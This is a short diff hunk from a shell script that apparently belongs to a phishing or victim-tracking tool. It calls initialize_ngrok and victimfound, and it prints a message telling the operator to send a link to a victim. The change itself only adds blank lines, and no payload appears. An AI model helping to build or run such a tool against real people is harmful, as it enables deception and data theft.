@@ -160,6 +160,9 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to vic
 initialize_ngrok
 victimfound
 }
+
+
+
 banner
 req
 menu
